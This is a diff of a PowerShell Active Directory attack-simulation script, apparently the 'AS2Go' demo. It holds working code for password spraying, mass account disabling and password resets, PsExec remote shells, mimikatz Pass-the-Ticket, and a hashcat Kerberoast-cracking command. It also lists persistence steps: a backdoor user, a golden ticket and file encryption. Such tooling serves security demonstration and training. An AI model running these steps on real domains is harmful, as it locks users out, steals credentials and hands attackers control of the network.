@@ -345,25 +345,31 @@ Function Start-PasswordSprayAttack
         {
            $Step += 1
            $user =   $Domain + "\" + $ADUSer.samaccountname
-           $progress = [int] (($Step - 1) / $TotalSteps * 100)
-           Write-Progress -Activity "Run Password Spray # $NoR against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
-           #Set-ProgressBar -Step $i -User $user -TotalSteps $ADUsers.Count
+           $progress = [int] (($Step) / $TotalSteps * 100)
+           Write-Progress -Id 0 -Activity "Run Password Spray # $NoR against user $User" -status "Completed $progress % of Password Spray Attack" -PercentComplete $progress
+           #Set-ProgressBar -Step $Step -User $user -TotalSteps $TotalSteps
            $Domain_check = New-Object System.DirectoryServices.DirectoryEntry("",$user,$Password)
+           
+                 
+           
            if ($Domain_check.name -ne $null)
               {
               Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
               Write-Host " with Password: " -NoNewline;Write-Host $Password -ForegroundColor Yellow
-              }
+             }
         }
 
-            If ($DeveloperMode) {
+        # close the process bar
+        Start-Sleep 1
+        Write-Progress -Activity "Run Password Spray # $NoR against user $User" -Status "Ready" -Completed
+        
+        
+        If ($DeveloperMode) {
               $ADUSer = Get-ADUser -Filter * -SearchBase $SearchBase | Sort-Object{Get-Random} | Select -First 1
               $user =   $Domain + "\" + $ADUSer.samaccountname
               Write-Host "Bingo $specChar found User: " -NoNewline; Write-Host $User -ForegroundColor Yellow -NoNewline
               Write-Host " with Password: " -NoNewline;Write-Host $Password -ForegroundColor Yellow
              }
-
-
 
 #####
 Write-Log -Message "### End Function $myfunction ###"
@@ -725,22 +731,40 @@ Write-Host "`n`n"
 Pause
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
-Write-Host "                Try to disable all users                            "
+Write-Host "               Try to disable all (DEMO) users                            "
 Write-Host "____________________________________________________________________`n" 
 Write-Host "`n NEXT STEP: " -NoNewline
 Write-Host "get-aduser -filter * -SearchBase $MySearchBase | Disable-ADAccount`n" -ForegroundColor $FGCCommand
 
-$question = "`nDo you want to disable $count users  - Y or N? Default "
+$question = "`nDo you want to disable all $count users  - Y or N? Default "
 $answer   = Get-Answer -question $question -defaultValue $Yes
 
-If ($answer -eq $yes)
-   {
-   get-aduser -filter * -SearchBase $MySearchBase |  select -First 100 | Disable-ADAccount
-   Write-Host ""   
-   Write-Host "Get-ADUser -filter * -Properties canonicalName, Modified, passwordlastset | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft" -ForegroundColor $FGCCommand
-   Get-ADUser -filter * -SearchBase $MySearchBase -Properties canonicalName, Modified, passwordlastset  | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft
-   Write-Host ""   
-   Pause
+If ($answer -eq $yes) {
+   $attributes = @("name","samaccountname","Enabled","passwordlastset","whenChanged")
+   $StartDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
+
+   If ($DeveloperMode) {
+      #First find a random char
+      Do
+       {
+       $NamePrefix = (65..90) | Get-Random -Count 1 | % {[char]$_}
+       $count = (Get-ADUser -Filter "name -like '$NamePrefix*'" -SearchBase $MySearchBase).count
+       } Until ([int]$count -gt 0)
+
+      Get-ADUser -Filter "name -like '$NamePrefix*'" -SearchBase $MySearchBase | Disable-ADAccount
+      Write-Log -Message "will modify users whose names begin with an $NamePrefix"
+     }
+   else {
+     Get-aduser -filter * -SearchBase $MySearchBase | Disable-ADAccount
+     }
+   
+   Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select $attributes  | Sort "Enabled" –Descending | ft
+   Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select $attributes | select -First 1  | Sort "Enabled"  | ft
+      
+   $EndDate   = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
+   $duration  = NEW-TIMESPAN –Start $StartDate –End $EndDate
+   Write-Host "  'Game over' after just " -NoNewline;Write-Host "$duration [h]" -ForegroundColor Yellow
+   pause
    }
 
 Clear-Host
@@ -750,20 +774,41 @@ Write-Host "____________________________________________________________________
 Write-Host "        Try to reset all users password                             "
 Write-Host "____________________________________________________________________`n" 
 Write-Host "`n NEXT STEP: " -NoNewline
-Write-Host "Set-ADAccountPassword -Reset -NewPassword $newRandomPW`n" -ForegroundColor $FGCCommand
+Write-Host "Get-aduser | Set-ADAccountPassword -Reset -NewPassword $newRandomPW`n" -ForegroundColor $FGCCommand
 
-$question = "`nDo you also want to reset user's password with an random password '$newRandomPW' - Y or N? Default "
+$question = "`nDo you also want to reset the user's password with the random password '$newRandomPW' - Y or N? Default "
 $answer   = Get-Answer -question $question -defaultValue $Yes
 
 If ($answer -eq $yes)
     {
+    $attributes = @("name","samaccountname","Enabled","passwordlastset","whenChanged")
+    $StartDate = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
     $newRandomPW = Get-RandomPassword
     $SecurePass = ConvertTo-SecureString -String $newRandomPW -AsPlainText -Force
-    get-aduser -filter * -SearchBase $MySearchBase |  select -First 100 | Set-ADAccountPassword -Reset -NewPassword $SecurePass
+    
+    If ($DeveloperMode) {
+      #First find a random char
+      Do
+       {
+       $NamePrefix = (65..90) | Get-Random -Count 1 | % {[char]$_}
+       $count = (Get-ADUser -Filter "name -like '$NamePrefix*'" -SearchBase $MySearchBase).count
+       } Until ([int]$count -gt 0)
+
+      Get-ADUser -Filter "name -like '$NamePrefix*'" -SearchBase $MySearchBase | Set-ADAccountPassword -Reset -NewPassword $SecurePass
+      Write-Log -Message "will reset users password whose names begin with an $NamePrefix"
+     }
+   else {
+     get-aduser -filter * -SearchBase $MySearchBase | Set-ADAccountPassword -Reset -NewPassword $SecurePass
+     }
+
     Write-Host ""     
-    Write-Host "Get-ADUser -filter * -Properties canonicalName, Modified, passwordlastset | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft" -ForegroundColor $FGCCommand    
-    Get-ADUser -filter * -SearchBase $MySearchBase -Properties canonicalName, Created, Modified, passwordlastset  | select sAMAccountName, Enabled, Modified, passwordlastset, userPrincipalName, name | select -First 20 | ft
-    Write-Host "" 
+  
+    Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select $attributes | Sort "passwordlastset" | ft
+    Get-ADUser -filter * -SearchBase $MySearchBase  -Properties $attributes | Select $attributes | select -First 2  | Sort "passwordlastset" | ft
+  
+    $EndDate   = (Get-Date).toString("yyyy-MM-dd HH:mm:ss")
+    $duration  = NEW-TIMESPAN –Start $StartDate –End $EndDate
+    Write-Host "  'Game over' after just " -NoNewline;Write-Host "$duration [h]`n" -ForegroundColor Yellow
     Pause
 }
 
@@ -959,7 +1004,7 @@ Pause
 Start-Process .\PsExec.exe -ArgumentList "\\$myAppServer -accepteula cmd.exe"
 write-host ""
 write-host ""
-write-host " Try to find some sensitive data. e.g. files with passwords" -ForegroundColor $global:FGCCommand
+write-host " Try to find some sensitive data, e.g. files with passwords" -ForegroundColor $global:FGCCommand
 write-host " more C:\temp\as2go\my-passwords.txt`n" -ForegroundColor $global:FGCCommand
 
 Pause
@@ -1495,7 +1540,7 @@ pause
 Clear-Host
 
 Write-Host "____________________________________________________________________`n" 
-Write-Host "          Try to Dump Credentials In-Memory from VictimPC           " 
+Write-Host "  Try to list all recently logged-on user credentials from VictimPC          " 
 Write-Host "____________________________________________________________________`n" 
 Write-Host ""
 
@@ -1575,7 +1620,7 @@ Write-Host "____________________________________________________________________
 
 
 
-Write-Host "`n`nplease run the following commands from the new DOS Windows:`n" -ForegroundColor $global:FGCQuestion
+Write-Host "`n`nPlease run the following command from the new Terminal Window:`n" -ForegroundColor $global:FGCQuestion
 Write-Host "00.cmd" -ForegroundColor $global:FGCCommand
 
 
@@ -1599,13 +1644,14 @@ Write-Log -Message "### Start Function $myfunction ###"
 $hostname = $env:computername
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
-Write-Host "              Pass-the-Ticket 'PtT' attack                          "
-Write-Host "                                                                    "
-Write-Host "                - stage mimikatz on Admin PC                        "
-Write-Host "                - harvest Ticket on Admin PC                        "
-Write-Host "                - PtT to become Domain Admin                        "
+Write-Host "           Try to run a Pass-the-Ticket 'PtT' attack                          "
 Write-Host "____________________________________________________________________`n" 
-write-host ""
+Write-Host " NEXT STEPS ARE: "
+Write-Host "                                                                    "
+Write-Host "      Step #1 - stage mimikatz on Admin PC"
+Write-Host "      Step #2 - harvest tickets on Admin PC"
+Write-Host "      Step #3 - run PtT to become Domain Admin"
+
 Pause
 Clear-Host
 # remove all old tickets
@@ -1767,7 +1813,7 @@ $myfunction = Get-FunctionName
 Write-Log -Message "### Start Function $myfunction ###"
 ####
 Write-Host "____________________________________________________________________`n" 
-Write-Host "       TRY to enumerate the members of the Domain Admins Groups     "
+Write-Host "       TRY to enumerate the members of the Domain Admins Group      "
 Write-Host "____________________________________________________________________`n`n" 
 
 Write-Host " Get-ADGroupMember -Identity 'Domain Admins' -Recursive | ft" -ForegroundColor $global:FGCCommand
@@ -1823,7 +1869,7 @@ Write-Log -Message "### Start Function $myfunction ###"
 ####
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
-Write-Host "       TRY to enumerate Group Policy Creator Owners members         "
+Write-Host "TRY to enumerate the members of the Group Policy Creator Owners group         "
 Write-Host "____________________________________________________________________`n" 
 
 Write-Host " Get-ADGroupMember -Identity 'Group Policy Creator Owners' -Recursive | ft" -ForegroundColor $global:FGCCommand
@@ -1834,7 +1880,7 @@ Write-Host ""
 Pause
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
-Write-Host "            TRY to enumerate Enterprise Admins members              "
+Write-Host "            TRY to enumerate all Enterprise Admins              "
 Write-Host "____________________________________________________________________`n" 
 
 Write-Host " Get-ADGroupMember -Identity 'Enterprise Admins' -Recursive | ft" -ForegroundColor $global:FGCCommand
@@ -2265,7 +2311,7 @@ If ($Begin -eq $yes)
   }
   else {
   $wshell = New-Object -ComObject Wscript.Shell
-  $Output = $wshell.Popup("Do NOT forget simulating domain activities by ""$domainadmin"" on your Admin PC!",0,"Simulate domain activities on Admin PC",0+64) 
+  $Output = $wshell.Popup("Do NOT forget to simulate domain activities by ""$domainadmin"" on your Admin PC!",0,"Simulate domain activities on Admin PC",0+64) 
   }
 
 Write-Host ""
@@ -2295,7 +2341,7 @@ Write-Host "            Attack Level - COMPROMISED User Account                 
 Write-Host "                Was this a PRIVLEDGE(!) Account?                    "
 Write-Host "____________________________________________________________________`n" 
 
-$question = "`n -> Enter (Y) to confirm or (N) for a non-sensitive user! Default "
+$question = "`n -> Enter [Y] to confirm or [N] for a non-sensitive user! Default "
 $answer   = Get-Answer -question $question -defaultValue $PrivledgeAccount
 
 
@@ -2748,9 +2794,8 @@ If ($answer -eq $yes)
     
     pause
     Write-Host "`n"
-    write-host "The next step is cracking the roasted hashes, HASHCAT is good tool for this." -ForegroundColor Yellow
-    Write-Host "The cracking mode for TGS-REP hashes is 13100`n"
-    Write-Host "example: " -NoNewline
+    write-host "The next step is cracking the roasted hashes. HASHCAT is good tool." -ForegroundColor Yellow
+    Write-Host "`nThe cracking mode for TGS-REP hashes is 13100, e.g.`n"
     Write-host "hashcat.exe -a 3 -m 13100 ./$hashes -1 123  -2 eqw ?1?2?1?2?1?2?s?u" -ForegroundColor Yellow
   
     pause
@@ -2791,7 +2836,7 @@ Clear-Host
 
 Write-Host "____________________________________________________________________`n" 
 Write-Host "                Attack Level - ACCESS SENSITIVE DATA                "
-Write-Host "               Try to find and exfiltrate these data                "
+Write-Host "              Try to find and exfiltrate sensitive data            "
 Write-Host "____________________________________________________________________`n" 
 
 $question = "`nDo you want to run this step - Y or N? Default "
@@ -2837,14 +2882,14 @@ Do
 Clear-Host
 Write-Host "____________________________________________________________________`n" 
 Write-Host "          Attack Level - DOMAIN COMPROMISED AND PERSISTENCE         "
-Write-Host "                                                                    "
-Write-Host "            #1 - create backdoor user                              "
-Write-Host "            #2 - export DPAPI master key                            "
-Write-Host "            #3 - PW reset and disable users                         "
-Write-Host "            #4 - Encrypt files                                      "
-Write-Host "            #5 - create golden ticket                               "
-Write-Host "            #6 - reboot (all machines)                              "  
 Write-Host "____________________________________________________________________`n" 
+
+Write-Host "               Step #1 - create a backdoor user"
+Write-Host "               Step #2 - export DPAPI master key"
+Write-Host "               Step #3 - PW reset and disable users"
+Write-Host "               Step #4 - Encrypt files"
+Write-Host "               Step #5 - create golden ticket"
+Write-Host "               Step #6 - reboot (all machines)"  
 
 $question = "`nDo you want to run these steps - Y or N? Default "
 $answer   = Get-Answer -question $question -defaultValue $Yes
@@ -2856,7 +2901,7 @@ If ($answer -eq $yes)
     
 
     Write-Host "____________________________________________________________________`n" 
-    Write-Host "        Create backdoor USER and add it to Sensitive Groups           "
+    Write-Host "        Create a backdoor USER and add it to Sensitive Groups           "
     Write-Host "____________________________________________________________________`n"     
     
     $question = "`nDo you want to run this step - Y or N? Default "
@@ -2895,7 +2940,15 @@ If ($answer -eq $yes)
     Write-Host "            User Manipulation - Disable & PW reset                   "
     Write-Host "____________________________________________________________________`n" 
   
-    Write-host "Your NEW backdoor user $global:BDUser use will be ignored :-)" -ForegroundColor $global:FGCHighLight    
+
+    $EmojiIcon = [System.Convert]::toInt32("1F600",16)
+    $Smily = [System.Char]::ConvertFromUtf32($EmojiIcon)
+
+
+    
+    Write-host "  ... will ignore your new backdoor user " -NoNewline
+    Write-host $global:BDUser -ForegroundColor $global:FGCHighLight -NoNewline
+    Write-Host " - $Smily"
         
     $question = "`nDo you want to run these steps - Y or N? Default "
     $answer   = Get-Answer -question $question -defaultValue $Yes
@@ -2988,28 +3041,7 @@ Stop-AS2GoDemo
 enter-pssession -ComputerName Ch01-DSP-MGMT
 
 
-Do
-{
-$NamePrefix = (65..90) | Get-Random -Count 1 | % {[char]$_}
-$count = (Get-ADUser -Filter "name -like '$NamePrefix*'").count
-} Until ([int]$count -gt 0)
 
-# Starting manipulation of xx users whose names begin with an xx ...
-Write-Host "Starting manipulation of " -NoNewline
-Write-Host $Count -NoNewline -ForegroundColor Yellow
-Write-Host " users whose names begin with an " -NoNewline
-Write-host -NoNewline $NamePrefix -ForegroundColor Yellow
-Write-Host " ...`n"
-pause
-
-$attributes = @("name","samaccountname","Enabled","pwdLastSet ","whenChanged")
-Get-ADUser -Filter "name -like '$NamePrefix*'"  | Disable-ADAccount
-Get-ADUser -Filter "name -like '$NamePrefix*'" -Properties * | Select $attributes | ft
-
-pause 
-
-Get-ADUser -Filter "name -like '$NamePrefix*'"  | Enable-ADAccount
-Get-ADUser -Filter "name -like '$NamePrefix*'" -Properties * | Select $attributes | ft
 
 
 #>
